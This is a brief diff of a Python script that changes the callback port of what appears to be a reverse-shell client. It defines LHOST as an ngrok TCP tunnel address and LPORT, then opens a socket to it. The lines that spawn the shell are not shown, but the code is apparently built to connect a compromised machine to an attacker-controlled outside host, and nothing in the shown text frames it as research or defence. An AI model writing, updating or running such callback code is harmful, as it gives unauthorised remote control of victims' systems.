@@ -2,7 +2,7 @@ import socket
 import os
 
 LHOST = "0.tcp.in.ngrok.io"
-LPORT = 19569
+LPORT = 17769
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
